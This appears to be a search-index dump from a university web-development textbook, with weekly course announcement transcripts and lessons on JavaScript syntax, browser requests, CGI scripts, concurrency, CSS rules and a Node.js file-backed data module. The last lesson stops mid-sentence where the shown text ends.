	"content": " "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week02/",
	"title": "Summer &#39;22 Week 2",
	"tags": [],
	"description": "",
	"content": " Resources Slides Video Script Hello, and welcome to the week two announcements for CIS 526 and CC 515, in summer 2022. So this week, you should be wrapping up milestone one, which is due tonight by midnight. So make sure you get that turned in and submitted, you\u0026rsquo;ll be submitting it via GitHub. So you\u0026rsquo;ll actually post your code to GitHub classroom, make sure you make a release tag or something there. And then in Canvas, you will submit that you can also submit your Codio we\u0026rsquo;ll be doing it that way as well. So there\u0026rsquo;s a couple of different places I\u0026rsquo;ll be able to find your code, but hopefully it is both in GitHub, and in Codio that I can find it. This Friday week two lessons are due, there\u0026rsquo;s four or five different interactive lessons this week. So make sure you work on those maybe set a goal to do one per day to get those lessons done by Friday. And then next Monday will be Milestone Two, which we\u0026rsquo;ll talk about here shortly.\nSo for this class milestone grading, I will try and take care of grading the new milestones milestone one this week, one thing I want to do is I will take a look at your code and try and give you some code comments on GitHub. If I see anything that you can improve on or anything that you might do a little bit differently. Or if I see something that you do, that\u0026rsquo;s really cool that I like, I will try and leave some comments. If you have anything in particular you want me to look at and give feedback on, you can put that in the submission comments on Canvas, or you can put them in the release notes in GitHub, when you actually create a release. I\u0026rsquo;ll try and look for those there. You can also send them to me on Discord or via email. But if they\u0026rsquo;re in the submission comments, or the release notes, I will probably see them as I\u0026rsquo;m doing my grading. The other big thing to keep in mind for the milestone grading is please be patient. There are 20 something of you. And there\u0026rsquo;s only one of me, and this is one of two classes I\u0026rsquo;m working on this summer, and I\u0026rsquo;ve got another side project I\u0026rsquo;m working on. So it may take me a few days to get through the milestone grading each week. I\u0026rsquo;ll try and do a few each day. But please be patient and just bear with me as I get through this milestone grading because it is a lot, especially as the milestones start to get larger later this semester.\nSo this week, week two, we\u0026rsquo;re going into advanced JavaScript in this class, we\u0026rsquo;re going to start by learning a little bit of JSON, javascript object notation, and AJAX, Asynchronous JavaScript and XML, although that\u0026rsquo;s really a misnomer, because we really don\u0026rsquo;t do XML. It\u0026rsquo;s more AJAJ a synchronous JavaScript and JSON these days, but it was originally designed for XML. We\u0026rsquo;ll also talk about Asynchronous JavaScript, you\u0026rsquo;ll learn a lot more about asynchronous languages and using the await and async keywords in JavaScript. We\u0026rsquo;ll talk a little bit about Web Workers and how we can spawn off a separate thread in our websites. And then we\u0026rsquo;ll start introducing Node.js and some of the ways that we can use JavaScript to write a back end server in the web, which leads to some of the later milestones. So moving on to talk about milestone two in this milestone, you\u0026rsquo;ll basically be redoing milestone one. But this time, you\u0026rsquo;ll be automating it in Milestone One, we actually hard coded all of our box locations and information into our web page. In milestone two, you\u0026rsquo;re going to use JavaScript and AJAX to get those box locations as a JSON file off of a web server. And then you will programmatically build your web page using that data. Other than that, you can use the same overall design as before. So a lot of your boilerplate code from your index dot HTML and from your site dot css will be repeated in this project, you\u0026rsquo;re just working on the JavaScript part to automate that.\nYou may run into a couple of issues with this project. The first issue is CORS or cross origin resource sharing. If you try and request a JSON file from another website that will actually be blocked by AJAX unless that website explicitly allows it. Generally, this is not a problem if you\u0026rsquo;re working in Codio because Codio allows CORS, and so we don\u0026rsquo;t have to worry about it there. So if you\u0026rsquo;re doing all your work in Codio, and you\u0026rsquo;re loading your JSON file directly from Codio, you shouldn\u0026rsquo;t have to worry about any CORS issues. However, if you do want to test this outside of Codio, if you\u0026rsquo;re working on this code on your local machine, for example, a lot of web browsers will not allow you to make an AJAX request against your local machine\u0026rsquo;s file system, you actually have to set up a web server. And so to get around that, in the instructions, I have posted the JSON file on my personal website on the CS Linux server, and it does allow CORS from anywhere. So if you want for testing only, especially if you\u0026rsquo;re testing it outside of Codio, you can start by using that URL to load the box locations. However, when you submit it, it should be working as it is in Codio. So it should be using a local URL to load your own copy of the box locations dot JSON file. But for testing only you can use the test one that I have put out on my website. The instructions are in the milestone details that you can find in Codio.\nThe other thing to note on milestone two is you are allowed to use external libraries in that milestone, if you so choose. We do not cover any of those libraries in this class. But if you are familiar with libraries, such as Bootstrap, or jQuery, you\u0026rsquo;re more than welcome to use those in the milestones. If you want to learn those libraries, this is a good opportunity to do that. However, I highly encourage you to think very hard about that because the learning curve for some of those libraries can be more significant than actually doing it by hand. And so especially for, in my model solutions that I was building this summer, I actually wrote both milestone one on milestone two in two different ways. I wrote them using completely raw JavaScript and no libraries in CSS. And I wrote them using Bootstrap and jQuery, just to see the difference. They were about the same level of complexity. But that\u0026rsquo;s assuming that you really know what you\u0026rsquo;re doing in jQuery and Bootstrap as far as building out the, the JavaScript and CSS required for those libraries. So it\u0026rsquo;s up to you if you want to use those libraries or not. Just for clarity, I\u0026rsquo;m most familiar with jQuery and Bootstrap if you want to use other libraries, specifically, the Tailwind CSS library, or there are several other JavaScript libraries out there. I will do my best to keep up with those. But my background is mostly in jQuery and Bootstrap. So those will be the ones I will be most likely to help you with, if you have any questions.\nSo that\u0026rsquo;s all I\u0026rsquo;ve got for this week. If you have any questions you can keep in touch, we\u0026rsquo;ve got our discussions going on Discord, it\u0026rsquo;s been great. Feel free to keep posting there and answering questions. I\u0026rsquo;m also available at tea time office hours, which are Tuesdays at 330 and Fridays at 1030. You can come join us work on your homework, just hang out whatever you want to do. We\u0026rsquo;ll be there all summer. And then of course, if you have any questions, you can schedule a one on one office hours with me via Calendly. Again, my time is kind of limited the summer I\u0026rsquo;m hoping to do as much as I can via email and discord. But if you need some one on one time with me feel free to schedule some time via Calendly. So that\u0026rsquo;s all I\u0026rsquo;ve got for this week, I\u0026rsquo;m actually reusing this gift for my system administration class announcements that I did earlier this morning, because I noticed that there\u0026rsquo;s really a way that these classes have synced up where we\u0026rsquo;re basically redoing the first project again, but this time, we\u0026rsquo;re adding automation and system administration, we\u0026rsquo;re automating building out virtual machines. In this class, we\u0026rsquo;re automating building websites using JSON files. So it\u0026rsquo;s really kind of interesting how these two classes have synced up. But I hope you can understand why we\u0026rsquo;re doing this while we\u0026rsquo;re actually trying to build our websites programmatically instead of statically. And that will help lead into the later part of this class where we actually start working on real full stack development. So as always, if you have any questions, let me know otherwise, good luck this week, and I will talk to you all again next week.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/old/summer2021/05-milestone5/",
	"title": "Milestone 5",
	"tags": [],
	"description": "",
	"content": " "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week03/",
	"title": "Summer &#39;22 Week 3",
	"tags": [],
	"description": "",
	"content": " Resources Slides Video Script Hello, and welcome to the week three announcements video for CIS 526 and CC 515 in summer 2022. So this week you should be working on milestone two it is due tonight. So make sure you get that turned in and submitted. As before. I\u0026rsquo;ll work on getting that graded and I\u0026rsquo;ll talk about that in just a second. This week, you\u0026rsquo;ll be working on the week three lessons, those are all due on Friday. And then next Monday, you will be turning in milestone three.\nSo once again, this week, I\u0026rsquo;ll be doing some milestone grading. Hopefully everybody saw their grades for Milestone One, including the comments in GitHub. That\u0026rsquo;s pretty much how we\u0026rsquo;ll be doing things throughout the semester, I usually will try and leave code comments and GitHub for anything that I see that you can work on improving there, the actual grading comments will be left in co do. And then in Canvas, you shouldn\u0026rsquo;t see a link that you can click to go to the grading feedback in co do to see any grading there. If you have any comments or questions on the grading, please let me know. And if there\u0026rsquo;s anything you want me to know, or want me to look at, in particular, you can use the comments on the submissions in Canvas, or you can put those in the notes somewhere in GitHub, and I should be able to see those. Please be patient with me as we do the milestone grading the first couple of milestones should go pretty quickly. Later, milestones are much more involved. And it may take me a few days to get through grading all of them. But I will try and get them graded within a few days after they\u0026rsquo;re due. So you\u0026rsquo;ll have enough time to work on them for the next week\u0026rsquo;s milestone.\nSo this week, we\u0026rsquo;re going into week three, we\u0026rsquo;re going to start talking about web servers in node.js, you will be looking at the request response cycle in node. So you\u0026rsquo;ll see a request coming in and then you\u0026rsquo;ll be building the response to get sent back out. We\u0026rsquo;ll learn how to serve files and serve media, we\u0026rsquo;ll talk a little bit about streaming media and things like that. And you\u0026rsquo;ll also have a quick crash course in regular expressions, which are really important to parse some of the things that we get with the request that comes in via node. So in milestone three, what we\u0026rsquo;re going to do is take our existing project that we\u0026rsquo;ve been working on the last two milestones, which is just a static HTML file. And we\u0026rsquo;ll be pivoting that so that we\u0026rsquo;re serving the static files from node. So instead of using the built in web server and co do, we\u0026rsquo;re going to actually build our own web server and node to serve those static files, your server should handle MIME types correctly, it should give the correct content length, it should also give 404 errors if we try and access something that is not present in that static folder. And then beyond that, it should basically handle everything from milestone one. And twos will need to correctly serve HTML, CSS and JavaScript files as well as that box-locations.json, so that all of that works correctly, you\u0026rsquo;ll also be adding the favicons into this project. So you\u0026rsquo;ll have those icons that show up in your browser. But basically milestone three, when it\u0026rsquo;s done, it should look and work exactly like what Milestone Two does, except this time it\u0026rsquo;s being served from node. Thankfully, if you go through the tutorials and get everything working there, most of milestone three is just pulling those parts out of the tutorials, getting them integrated into this project and rebuilding that from scratch here. So a lot of it is just copy pasting stuff and adapting it a little bit from the tutorials earlier in the week. It shouldn\u0026rsquo;t be that terribly difficult. But you may have to do some debugging if you\u0026rsquo;re not really careful about how you bring it into your content.\nSo that\u0026rsquo;s really all I got for today. Otherwise, you can keep in touch. We\u0026rsquo;re having great discussions on Discord. So you can always ask questions and get feedback there. You can join me for tea time office hours, which are Tuesdays at 330 and Fridays at 1030. You can schedule a one on one office hours with me using my Calendly link that\u0026rsquo;s in the bottom of all my emails and my email signature. You can also send me an email anytime you have questions. I\u0026rsquo;m happy to help. We\u0026rsquo;ve got lots of ways that you can get help in this class. And of course, if you discuss in this court and you help some of your fellow classmates, you can get some of those Helping Hand bonus points. So other than that your focus this week is building a web server that hopefully won\u0026rsquo;t crash ever. You\u0026rsquo;ve got to be able to handle all those errors, handle 404 errors get that content served up correctly. And if you do that you should be in good place to work on the next few milestones, which will really start ramping up the complexity of our web server in Node.js. So best of luck this week. I look forward to seeing all your milestones and I will talk to you again next week.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/02-basic-syntax/",
	"title": "Basic Syntax",
	"tags": [],
	"description": "",
	"content": " CONSOLE Because Netscape was adopting Java at the same time they were developing what would become JavaScript, there was a push to make the syntax stay somewhat consistent between the two languages. As a result, JavaScript has much of the look and feel of an imperative language like C, C#, or Java.\nHowever, this similarity can be deceptive, because how JavaScript operates can be quite different than those languages. This can lead to frustration for imperative programmers learning JavaScript. As we go over the basics of the language, I will strive to call out these tricky differences.\nTo assist you in learning JavaScript syntax, we\u0026rsquo;ve added an interactive console to this textbook where you can type in arbitrary JavaScript code and see the result of its execution, much like the console that Developer Tools provide. You can click the word \u0026ldquo;Console\u0026rdquo; on the purple tab below to expand it, and click it again to minimize it.\nInterpreted Language JavaScript is an interpreted language, which means instead of being compiled into machine code, it is interpreted by a special program - an interpreter. Each browser has its own interpreter implementation.\nLet\u0026rsquo;s start with a traditional example:\nconsole.log(\u0026#34;hello world\u0026#34;); Copy/paste or type this code into the console provided at the bottom of the page. What is the output?\nAs you might expect, this prints the string \u0026ldquo;hello world\u0026rdquo; to standard output. Notice we didn\u0026rsquo;t need to put this code into a main function - JavaScript code is executed as it is encountered by the interpreter.\nTerminating Lines of Code Also, the semicolon is an optional way to end an expression. A new line is other way to do so, so these two programs:\nconsole.log(\u0026#34;Hello\u0026#34;) console.log(\u0026#34;World\u0026#34;) and\nconsole.log(\u0026#34;Hello\u0026#34;);console.log(\u0026#34;World\u0026#34;); are equivalent. We can also use both a semicolon and a new line (as in the first example). A common technique for making JavaScript files smaller, known as minifying takes advantage of this fact to write an entire program in a single line! We\u0026rsquo;ll discuss how and when to do so later.\nData Types Like any programming language, JavaScript has a number of predefined data types. We can also query the data type of a value at runtime, using the typeof keyword. Try typing some of these lines into the console:\ntypeof 5; typeof 1.3; typeof \u0026#34;Hello\u0026#34;; typeof true; Numbers Numbers include integers and floats, though JavaScript mostly uses the distinction for how a value is stored in memory and presents the programmer with the number type. This category also includes some special values, like NaN (not a number) and Infinity. We can perform all the standard arithmetic operations on any number (+, -, *, /).\nThese operations are also \u0026ldquo;safe\u0026rdquo; in the sense that they will not throw an error. For example, try typing 4/0 in the terminal below. The value you see as a result is still a number!\nThe JavaScript interpreter will switch between an integer and float representation internally as it makes sense to. For example, type 4.0 and you\u0026rsquo;ll see the console echoes 4 to you, showing it is storing the number as an integer. Try typing 4.1, and you\u0026rsquo;ll see it stores it as a float.\nStrings The string type in JavaScript can be declared literally using single (') or double (\u0026quot;) quotes, and as of ES6, tick marks (`).\nDouble and single-quoted strings work exactly the same. They must be on the same line, though you can add newline characters to both using \\n. The backslash is used as an escape character, so to include it in a string you must use a double-backslash instead \\\\. Finally, in a single-quoted string you can escape a single quote, i.e. 'Bob\\'s Diner', and similarly for double-quotes: \u0026quot;\\\u0026quot;That's funny,\\\u0026quot; she said.\u0026quot; Judicious choices of single-or double-quoted strings can avoid much of this complication.\nYou can also directly reference unicode characters with \\u[ref number]. Try typing the sequence \u0026quot;\\u1F63C\u0026quot;.\nFinally, strings enclosed with tick marks (`) are template literals that have a few special properties. First, they can span multiple lines, i.e.:\n`This is a multiline string example` The line breaks will be interpreted as new line characters. Secondly, you can embed arbitrary JavaScript inside of them using ${}. Give it a try:\n`The sum of 2 and 3 is ${2 + 3}` Info\nIn JavaScript there is no character type. In practice, the role characters normally play in programs is filled by strings of length one.\nBooleans JavaScript also has the boolean literals true and false. It also implements the boolean logical operators \u0026amp;\u0026amp; (logical and) || (logical or), and ! (logical not).\nUndefined JavaScript has a special value undefined that means a value hasn\u0026rsquo;t been set. You probably saw it when you entered the console.log(\u0026quot;Hello World\u0026quot;) example above, which spit out:\n\u0026gt; Hello World! \u0026gt; undefined As the console echoes the value of the prior line, it was printing the return value of console.log(). Since console.log() doesn\u0026rsquo;t return a value, this results in undefined.\nNull JavaScript also defines a null type, even though undefined fills many of the roles null fills in other languages. However, the programmer must explicitly supply a null value. So if a variable is null, you know it was done intentionally, if it is undefined, it may be that it was accidentally not initialized.\nObjects The object type is used to store more than one value, and functions much like a dictionary in other languages. Objects can be declared literally with curly braces, i.e.:\n{ first: \u0026#34;Jim\u0026#34;, last: \u0026#34;Hawkins\u0026#34;, age: 16 } An object is essentially a collection of key/value pairs, known as properties. We\u0026rsquo;ll discuss objects in more depth in the Objects and Classes section.\nSymbols Finally, the symbol type is a kind of identifier. We\u0026rsquo;ll discuss it more later.\nVariables JavaScript uses dynamic typing. This means the type of a variable is not declared in source code, rather it is determined at runtime. Thus, all variables in JavaScript are declared with the var keyword, regardless of type:\nvar a = \u0026#34;A string\u0026#34;; // A string var b = 2; // A number var c = true; // A boolean In addition, the type of a variable can be changed at any point in the code, i.e. the statements:\nvar a = \u0026#34;A string\u0026#34;; a = true; is perfectly legal and workable. The type of a, changes from a string to a float when its value is changed.\nIn addition to the var keyword, constants are declared with const. Constants must have a value assigned with their declaration and cannot be changed.\nFinally, ECMA6 introduced the let keyword, which operates similar to var but is locally scoped (see the discussion of functional scope for details).\nType Conversions JavaScript does its best to use the specified variable, which may result in a type conversion. For example:\n\u0026#34;foo\u0026#34; + 3 Will result in the string 'foo3', as the + operator means concatenation for strings. However, / has no override for strings, so\n\u0026#34;foo\u0026#34; / 3 Will result in NaN (not a number).\nAdditionally, when you attempt to use a different data type as a boolean, JavaScript will interpret its \u0026rsquo;truthiness\u0026rsquo;. The values null, undefined, and 0 are considered false. All other values will be interpreted as true.\nControl Structures JavaScript implements many of the familiar control structures of conditionals and loops.\nWarning\nBe aware that variables declared within a block of code using var are subject to function scope, and exist outside of the conditional branch/loop body. This can lead to unexpected behavior.\nIf Else Statements The JavaScript if and if else statements look just like their Java counterparts:\nif(\u0026lt;logical test\u0026gt;) { \u0026lt;true branch\u0026gt; } if(\u0026lt;logical test\u0026gt;) { \u0026lt;true branch\u0026gt; } else { \u0026lt;false branch\u0026gt; } Loops As do while and do while loops:\nwhile(\u0026lt;logical test\u0026gt;) { \u0026lt;loop body\u0026gt; } do { \u0026lt;loop body\u0026gt; }(\u0026lt;logical test\u0026gt;); And for loops:\nfor(var i = 0; i \u0026lt; 10; i++) { \u0026lt;loop body\u0026gt; } JavaScript also introduces a for ... in loop, which loops over properties within an object. I.e.:\nvar jim = { first: \u0026#34;Jim\u0026#34;, last: \u0026#34;Hawkins\u0026#34;, age: 16 } for(key in jim) { console.log(`The property ${key} has value ${jim[key]}`); } and the for ... of which does the same for arrays and other iterables:\nvar fruits = [\u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;pear\u0026#34;]; for(value of fruits) { console.log(`The fruit is a ${value}`); } Try writing some control structures.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/02-browser-requests/",
	"title": "Browser Requests",
	"tags": [],
	"description": "",
	"content": "Before we get too deep in the details of what a request is, and how it works, let\u0026rsquo;s explore the primary kind of request you\u0026rsquo;re already used to making - requests originating from a browser. Every time you use a browser to browse the Internet, you are creating a series of HTTP (or HTTPS) requests that travel across the networks between you and a web server, which responds to your requests.\nTo help illustrate how these requests are made, we\u0026rsquo;ll once again turn to our developer tools. Open the example page this link. On that tab, open your developer tools with CTRL + SHIFT + i or by right-clicking the page and selecting \u0026ldquo;Inspect\u0026rdquo; from the context menu. Then choose the \u0026ldquo;Network\u0026rdquo; tab:\nThe network tab displays details about each request the browser makes. Initially it will probably be empty, as it does not log requests while not open. Try refreshing the page - you should see it populate with information:\nThe first entry is the page itself - the HTML file. But then you should see entries for site.css, brazil.gif, fiber-4814456_960_720.jpg, jquery-3.5.1.slim.min.js, and site.js. Each of these entries represents an additional resource the browser fetched from the web in order to display the page.\nTake, for example, the two images brazil.gif and fiber-4814456_960_720.jpg. These correspond to \u0026lt;img\u0026gt; tags in the HTML file:\n\u0026lt;img alt=\u0026#34;Paper scene from the film Brazil\u0026#34; src=\u0026#34;brazil.gif\u0026#34;/\u0026gt; \u0026lt;img alt=\u0026#34;Fiber optic cables\u0026#34; src=\u0026#34;https://cdn.pixabay.com/photo/2020/02/03/00/12/fiber-4814456_960_720.jpg\u0026#34;/\u0026gt; The important takeaway here is that the image is requested separately from the HTML file. As the browser reads the page and encounters the \u0026lt;img\u0026gt; tag, it makes an additional request for the resource supplied in its src attribute. When that second request finishes, the downloaded image is added to the web page.\nNotice too that while one image was on our webserver, the other is retrieved from Pixabay.com\u0026rsquo;s server.\nSimilarly, we have two JavaScript files:\n\u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.5.1.slim.min.js\u0026#34; integrity=\u0026#34;sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;site.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; As with the images, one is hosted on our website, site.css, and one is hosted on another server, jquery.com.\nBoth the Pixabay image and the jQuery library are hosted by a Content Delivery Network- a network of proxy servers that are distributed geographically in such a way that a request for a resource they hold can be processed from a nearby server. Remember that the theoretical maximum speed for internet transmissions is the speed of light (for fiber optics) or electrons in copper wiring. Communication is further slowed at each network switch encountered. Serving files from a nearby server can prove very efficient at speeding up page loads because of the shorter distance and smaller number of switches involved.\nA second benefit of using a CDN to request the JQuery library is that if the browser has previously downloaded the library when visiting another site it will have cached it. Using the cached version instead of making a new request is much faster. Your app will benefit by faster page loads that use less bandwidth.\nNotice too that the jQuery \u0026lt;script\u0026gt; element also uses the integrity attribute to allow the browser to determine if the library downloaded was tampered with by comparing cryptographic tokens. This is an application of Subresource Integrity, a feature that helps protect your users. As JavaScript can transform the DOM, there are incentives for malicious agents to supplant real libraries with fakes that abuse this power. As a web developer you should be aware of this, and use all the tools at your disposal to keep your users safe.\nYou can use the network tab to help debug issues with resources. Click on one of the requested resources, and it will open up details about the request:\nNotice that it reports the status code along with details about the request and response, and provides a preview of the requested resource. We\u0026rsquo;ll cover what these all are over the remainder of this chapter. As you learn about each topic, you may want to revisit the tab with the example to see how these details correspond to what you are learning.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/02-cgi-scripts/",
	"title": "CGI Scripts",
	"tags": [],
	"description": "",
	"content": "Before we dig too deeply into dynamic web servers, we should review our technologies used in the web. On the client side, we have HTML, CSS, and JavaScript. Managing communication between the client and server, we have HTTP. But on the server side of the equation, what standard web technologies do we use?\nThe answer is none. There is no standard server development language. In fact, web servers can be written in almost every programming language. This gives web application developers a tremendous amount of flexibility. Of course, that also means the choice of server-side technologies can quickly become overwhelming.\nOne technology that emerged to help manage some of this complexity was the Common Gateway Interface (CGI), a web standard that allowed a traditional static webserver to respond to some requests by running a command-line program and piping the output to the requesting client. The CGI standard defined what variables needed to be collected by the web server and how they would be provided to the script.\nThe script itself could be written in any language that could communicate using stdin and stdout, though in practice most CGI scripts were written using Perl or Bash script. This strategy was popular with the system admins responsible for deploying webservers like Apache, as these scripting languages and command-line programs were familiar tools. While CGI scripts can be used to build dynamic web pages, by far their most common use was to consume forms filled out by a user, often saving the results to a file or database or sending them via email.\nCGI scripts are still used today, but they do have some important limitations. First, for each kind of request that needed handled, a new script would need to be written. The open-ended nature of CGI scripts meant that over time a web application become a patchwork of programs developed by different developers, often using different languages and organizational strategies. And since running a CGI script typically means starting a separate OS process for each request, the CGI approach does not scale well to web applications in high demand.\nThus, web developers began seeking new strategies for building cohesive web servers to provide rich dynamic experiences.\nInfo\nYour personal web space on the CS Departmental Server supports CGI scripts. So if you would like to try to develop one, you can deploy it there. More details can be found on the support Personal Web Pages entry.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/03-asynchronous-js/02-concurrency-approaches/",
	"title": "Concurrency Approaches",
	"tags": [],
	"description": "",
	"content": "Concurrency means \u0026ldquo;doing more than one thing at the same time.\u0026rdquo; In computer science, concurrency can refer to (1) structuring a program or algorithm so that it can be executed out-of-order or in partial order, or (2) actually executing computations in parallel. In modern-day programming, we\u0026rsquo;re often talking about both. But to help us develop a stronger understanding, let\u0026rsquo;s look at the two ideas one-at-a-time, and then bring it together.\nConcurrency One of the earliest concurrency problems computer science dealt with was the efficient use of early computers. Consider a mainframe computer like the PDP-1, once a staple of the university computer science department. In 1963, the base price of a PDP-1 was $120,000. Adjusted for inflation, this would be a price of a bit more than one million dollars in 2020! That\u0026rsquo;s a pretty big investment! Any institution, be it a university, a corporation, or a government agency that spent that kind of money would want to use their new computer as efficiently as possible.\nConsider when you are working on a math assignment and using a calculator. You probably read your problem carefully, write out an equation on paper, and then type a few calculations into your calculator, and copy the results to your paper. You might write a few lines as you progress through solving the problem, then punch a new calculation into your calculator. Between computations, your calculator is sitting idle - not doing anything. Mainframe computers worked much the same way - you loaded a program, it ran, and spat out results. Until you loaded a new program, the mainframe would be idle.\nBatch Processing An early solution was the use of batch processing, where programs were prepared ahead of time on punch-card machines or the like, and turned over to an IT department team that would then feed these programs into the computer. In this way, the IT staff could keep the computer working as long as there was batched work to do. While this approach kept the computer busy, it was not ideal for the programmers. Consider the calculator example - it would be as if you had to write out your calculations and give them to another person to enter into the calculator. And they might not get you your results for days!\nCan you imagine trying to write a program that way? In the early days that was exactly how CS students wrote programs - they would write an entire program on punch cards, turn it in to the computer staff to be batched, and get the results once it had been run. If they made a mistake, it would require another full round of typing cards, turning them in, and waiting for results!\nBatch processing is still used for some kinds of systems - such as the generation of your DARS report at K-State, for sending email campaigns, and for running jobs on Beocat and other supercomputers. However, in mainframe operations it quickly was displaced by time sharing.\nTime Sharing Time-sharing is an approach that has much in common with its real-estate equivalent that shares its name. In real estate, a time-share is a vacation property that is owned by multiple people, who take turns using it. In a mainframe computer system, a time sharing approach likewise means that multiple people share a single computer. In this approach, terminals (a monitor and keyboard) are hooked up to the mainframe. But there is one important difference between time-sharing real estate and computers, which is why we can call this approach concurrent.\nLet\u0026rsquo;s return to the example of the calculator. In the moments between your typing an expression and reading the results, another student could type in their expression, and get their results. A time-sharing mainframe does exactly that - it take a few fractions of a second to advance each users\u0026rsquo; program, switching between different users at lightning speed. Consider a newspaper where twenty people might we writing stories at a given moment - each terminal would capture key presses, and send them to the mainframe when it gave its attention, which would update the text editor, and send the resulting screen data back to the terminal. To the individual users, it would appear the computer was only working with them. But in actuality it was updating all twenty text editor program instances in real-time (at least to human perception).\nLike batch processing, time-sharing is still used in computing today. If you\u0026rsquo;ve used the thin clients in the DUE 1114 lab, these are the current-day equivalents of those early terminals. They\u0026rsquo;re basically a video card, monitor, and input device that are hooked up to a server that runs multiple VMs (virtual machines), one for each client, and switches between them constantly updating each.\nMultitasking The microcomputer revolution did not do away with concept. Rather, modern operating systems still use the basic concept of the approach, though in the context of a single computer it is known as multitasking. When you write a paper now, your operating system is switching between processes in much the same way that time-sharing switched between users. It will switch to your text editor, processing your last keystroke and updating the text on screen. Then it will shift to your music player and stream the next few thousand bytes of the song you\u0026rsquo;re listening to the sound card. Then it will switch to your email program which checks the email server and it will start to notify you that a new email has come in. Then it will switch back to your text editor.\nThe thin clients in DUE 1114 (as well as the remote desktops) are therefore both time-sharing between VMs and multitasking within VMs.\nParallel Processing The second approach to concurrency involves using multiple computers in parallel. K-State\u0026rsquo;s Beocat is a good example of this - a supercomputer built of a lot of individual computers. But your laptop or desktop likely is as well; if you have a multi-core CPU, you actually have multiple processors built into your CPU, and each can run separate computational processes. This, it is entirely possible that as you are writing your term paper the text editor is running on one processor, your email application is using a second one, and your music is running on a third.\nIn fact, modern operating systems use both multitasking and parallel processing in tandem, spreading out the work to do across however many cores are available, and swapping between active processes to on those cores. Some programs also organize their own computation to run on multiple processors - your text editor might actually be handling your input on one core, running a spellcheck on a second, and a grammar check on a third.\nRemember our earlier discussion about scaling web servers? This is also a parallel processing approach. Incoming HTTP requests are directed by a load balancer to a less-busy server, and that server formulates the response.\nMultithreading Individual programs can also be written to execute on multiple cores. We typically call this approach Multithreading, and the individually executing portions of the program code threads.\nThese aren\u0026rsquo;t the only ways to approach concurrency, but they are ones we commonly see in practice. Before we turn our attention to how asynchronous processes fit in though, we\u0026rsquo;ll want to discuss some of the challenges that concurrency brings.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/02-rule-format/",
	"title": "CSS Rules",
	"tags": [],
	"description": "",
	"content": "CSS properties consist of key-value pairs separated by a colon (:). For example:\ncolor: red\nindicates that the styled HTML elements should be given a red color.\nMultiple properties are separated by semicolons (;), i.e.:\ncolor: red; background-color: green; Rules are CSS properties grouped within curly braces ({}) and proceeded by a CSS selector to identify the HTML element(s) they should be applied to:\np { color: red; background-color: green; } In this example, all paragraph elements (\u0026lt;p\u0026gt;) should have red text on a green background (how festive!).\nAnd difficult to read! Short Forms Some properties have multiple forms allowing for some abbreviation. For example, the CSS property:\nborder: 1px solid black\nis a short form for three separate border-related properties:\nborder-width: 1px; border-style: solid; border-color: black; Experimental Features and Prefixes As new features are considered for inclusion in CSS, browsers may adopt experimental implementations. To separate these from potentially differing future interpretations, these experimental properties are typically prefixed with a browser-specific code:\n-webkit- Webkit Browsers (Chrome, Safari, newer Opera versions, and iOS) -moz- Mozilla -ms- Microsoft browsers (IE, Edge) -o- Older Opera versions For example, most browsers adopted the box-shadow property before it achieved candidate status, so to use it in the Mozilla browser at that point you would use:\n-moz-box-shadow: black 2px 2px 2px\nTo make it work for multiple browsers, and future browsers when it was officially adopted, you might use:\n-webkit-box-shadow: black 2px 2px 2px; -moz-box-shadow: black 2px 2px 2px; -ms-box-shadow: black 2px 2px 2px; box-shadow: black 2px 2px 2px; The browser will ignore any properties it does not recognize, hence in Chrome 4, the -webkit-box-shadow will be used and the rest ignored, while in Chrome 10+ the box-shadow property will be used.\nNote\nYou should always place the not-prefixed version last, to override the prefixed version if the browser supports the official property.\nTip\nThe Mozilla Developer Network maintains a wiki of comprehensive descriptions of CSS properties and at the bottom of each property\u0026rsquo;s page is a table of detailed browser support. For example, the box-shadow property description can be found at: https://developer.mozilla.org/en-US/docs/Web/CSS/box-shadow. By combining the css property name and the keyword mdn in a Google search, you can quickly reach the appropriate page.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/07-persistent-storage/02-data-serialization/",
	"title": "Data Serialization",
	"tags": [],
	"description": "",
	"content": "Perhaps the simplest persistent storage mechanism we can adopt is to use a combination of an in-memory variable and a file. For example, we could set up a simple database mechanism as a Node module:\nconst fs = require(\u0026#39;fs\u0026#39;); /** @module database * A simple in-memory database implementation, * providing a mechanism for getting and saving * a database object */ module.exports = { get, set }; // We retrieve and deserialize the database from // a file named data.json. We deliberately don\u0026#39;t // catch errors, as if this process fails, we want // to stop the server loading process var fileData = fs.readFileSync(\u0026#39;data.json\u0026#39;); var data = JSON.parse(fileData); /** @function get() * Returns the database object * @returns {object} data - the data object */ function get() { return data; } /** @function set() * Saves the provided object as the database data, * overwriting the current object * @param {object} newData - the object to save * @param {function} callback - triggered after save */ function set(newData, callback) { // Here we don\u0026#39;t want the server to crash on // an error, so we do wrap it in a try/catch try { var fileData = JSON.stringify(newData); fs.writeFile(\u0026#34;data.json\u0026#34;, fileData, (err) =\u0026gt; { // If there was an error writing the data, we pass it // forward in the callback and don\u0026#39;t save the changes // to the data object if(err) return callback(err); // If there was no error, we save the changes to the // module\u0026#39;s data object (the variable data declared above) data = newData // Then we invoke the callback to notify of success by sending // a value of null for the error callback(null); }); } catch (err) { // If we catch an error in the JSON stringification process, // we\u0026#39;ll pass it through the callback callback(err); } } In this module, we exploit a feature of Node\u0026rsquo;s require, in that it caches the value returned by the require() function for each unique argument. So the first time we use require('./database'), we process the above code. Node internally stores the result (an object with the get() and set() method) in its module cache, and the next time we use require('./database') in our program, this object is what is required. Effectively, you end up using the same data variable every time you 